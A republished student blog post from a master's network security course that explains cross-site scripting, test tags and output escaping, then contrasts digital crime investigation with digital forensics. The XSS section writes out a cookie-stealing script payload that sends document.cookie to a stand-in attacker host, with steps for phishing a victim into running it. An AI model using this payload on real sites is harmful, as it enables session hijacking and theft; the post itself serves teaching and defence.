---
layout: post
title: My Opinion of XSS/CSS, Digital Forensic, and Digital Crime Investigation when I was a Young Student
categories: masters
tags: [technology, computers, XSSCSS, digital forensic, assignment]
featuredimage: https://steemitimages.com/640x0/https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png
description: My Opinion of XSS/CSS, Digital Forensic, and Digital Crime Investigation when I was a Young Student
canonicalurl: https://0fajarpurnama0.github.io/masters/2020/07/20/opinion-xsscss-digital-forensic-crime-investigation
---
![0.featured-image.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png)


## Note

This is the fourteenth assignment from my Masters Advanced Network Security Course which has never been published anywhere and I, as the author and copyright holder, license this assignment customized CC-BY-SA where anyone can share, copy, republish, and sell on condition to state my name as the author and notify that the original and open version available here.

## 1\. XSS/CSS

XSS/CSS stands for cross site scripting which is a computer security vulnerability to inject scripts into web pages viewed by other users [1]. What is the difference between code injection? Code injection is a server side vulnerability while XSS is a client side vulnerability, what they have in common is they are injection type attack [2]. One of the easiest method to check for XSS vulnerability is to include a html tags into the submission form, for example on Figure 1 is an ```<S>``` (strike-through) html tag inserted on a simple php form input (any php tutorial on the web have this tutorial) and Figure 2 is an example of using ```<img src=””>``` tag to add an image, even worse we can input tags that could display the attacker site instead and take the victim site with ```<script>```document.location="http://some_attacker/cookie.cgi?" + document.cookie```</script>```. (1) Once a XSS vulnerability had been found we can send a phising email to the user of the site containing the XSS script. (2) With a good social engineering the user site can be tricked in running the code and connect to attacker's site through the vulnerable XSS site. (3) The attacker can obtain the session ID and other informations of the victim. [3]

![1.strikethroughXSSexample.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmYm6X16ideByV9t7ZAJnXb5ypBVHbq3khnuhkvkkB4AYz/1.strikethroughXSSexample.png)

Figure 1\. Checking XSS vulnerability strike through HTML tag example.



To prevent XSS we have to filter the user input. One way is to not allow html tags for, or perform sensitization allowing text formatting tag such as ```<B>``` ```<U>``` ```<I>``` ```<S>```, and converting dangerous tags like “&→&amp”, “&lt→&lt”, “&gt→&gt”, “”→&quot”, “'→&x27”, and “/→&x2f”. For my above PHP code I can fix it by changing the output function (adding) into “echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8')”. There are libraries available for filtering XSS if it's difficult to make our own libraries such as “PHP AntiXSS”, “xss_clean.php filter”, “htmlpurifier”, “xssprotect”, and “XSS html filter”. [4]

![2.imgsrcXSS.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmYqWwbtpStpvT7u52VrGNSTGKKnaGh5c9tuZtAAmAhGyE/2.imgsrcXSS.png)

Figure 2\. Checking XSS vulnerability image HTML tag example.



## 2\. Digital Crime Investigation vs Digital Forensic

Digital crime investigation is mainly used in criminal investigation in order to enhance the criminal investigation process itself. It's more like an auxiliary to tool in which is specifically digital typed tools. For example (1) the use of surveillance camera to capture robbery incident in stores, (2) categorizing data, clustering data, plotting graph, which is under data mining, (3) using database to store crime records. On the other hand digital forensic is to extract, collect, analyze, and preserve digital evidence, for example to be shown in court. [5]

![3.digital-forensic-on-hardware.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmautrcqEVMghJ5C6GvKa4N5CRGqAoG187s1oh7zcFSMWi/3.digital-forensic-on-hardware.png)

Figure 3\. Illustration of digital forensic on hardware containing data.



Both digital crime investigation and digital forensic are part of a subject called forensic science. Performing autopsy on a dead body to find the cause of death is an example of medical forensic. Then examining a computer to search for informations of itself being attacked is an example of digital forensic. The basic step is to (1) identify the attack, its extent and damage caused, (2) identify the source of the attack, (3) record the incident. The scope of digital forensic can be computer forensic as example above, or network forensic which the larger scale with the computer forensic included into the network forensic. Unlike medical forensic we can first create a duplicate of the computer data or network data before running digital forensic which is a safe type of investigation that avoids the risk of destroying the evidence. Most popularly examined on digital forensics are maintenance of files and folders, disk logs, server logs, logs from IDS/IPS, and network packets if captured. [5]

## 3\. Reference

1.  [https://en.wikipedia.org/wiki/Cross-site_scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
2.  [https://community.rapid7.com/community/nexpose/blog/2013/06/20/xss-vs-injection](https://community.rapid7.com/community/nexpose/blog/2013/06/20/xss-vs-injection)
3.  [http://md.kumamoto-u.ac.jp/mod/book/view.php?id=98590&chapterid=4892](http://md.kumamoto-u.ac.jp/mod/book/view.php?id=98590&chapterid=4892)
4.  [http://resources.infosecinstitute.com/how-to-prevent-cross-site-scripting-attacks](http://resources.infosecinstitute.com/how-to-prevent-cross-site-scripting-attacks)
5.  [http://md.kumamoto-u.ac.jp/mod/book/view.php?id=98593&chapterid=4897](http://md.kumamoto-u.ac.jp/mod/book/view.php?id=98593&chapterid=4897)

## Mirrors

*   [https://www.publish0x.com/fajar-purnama-academics/my-opinion-of-xsscss-digital-forensic-and-digital-crime-inve-xlyemxz?a=4oeEw0Yb0B&tid=github](https://www.publish0x.com/fajar-purnama-academics/my-opinion-of-xsscss-digital-forensic-and-digital-crime-inve-xlyemxz?a=4oeEw0Yb0B&tid=github)
*   [https://0darkking0.blogspot.com/2021/02/my-opinion-of-xsscss-digital-forensic.html](https://0darkking0.blogspot.com/2021/02/my-opinion-of-xsscss-digital-forensic.html)
*   [https://0fajarpurnama0.medium.com/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student-125b754a3a89](https://0fajarpurnama0.medium.com/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student-125b754a3a89)
*   [https://0fajarpurnama0.github.io/masters/2020/07/20/opinion-xsscss-digital-forensic-crime-investigation](https://0fajarpurnama0.github.io/masters/2020/07/20/opinion-xsscss-digital-forensic-crime-investigation)
*   [https://hicc.cs.kumamoto-u.ac.jp/~fajar/masters/opinion-xsscss-digital-forensic-crime-investigation](https://hicc.cs.kumamoto-u.ac.jp/~fajar/masters/opinion-xsscss-digital-forensic-crime-investigation)
*   [https://steemit.com/technology/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?r=fajar.purnama](https://steemit.com/technology/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?r=fajar.purnama)
*   [https://stemgeeks.net/technology/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?ref=fajar.purnama](https://stemgeeks.net/technology/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?ref=fajar.purnama)
*   [https://blurtter.com/blurtech/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?referral=fajar.purnama](https://blurtter.com/blurtech/@fajar.purnama/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student?referral=fajar.purnama)
*   [https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student](https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student)
*   [http://0fajarpurnama0.weebly.com/blog/my-opinion-of-xsscss-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student](http://0fajarpurnama0.weebly.com/blog/my-opinion-of-xsscss-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student)
*   [https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/205-my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student](https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/205-my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student)
*   [https://read.cash/@FajarPurnama/my-opinion-of-xsscss-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student-81cbb266](https://read.cash/@FajarPurnama/my-opinion-of-xsscss-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student-81cbb266)
*   [https://www.uptrennd.com/post-detail/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student~ODYyMzY4](https://www.uptrennd.com/post-detail/my-opinion-of-xss-css-digital-forensic-and-digital-crime-investigation-when-i-was-a-young-student~ODYyMzY4)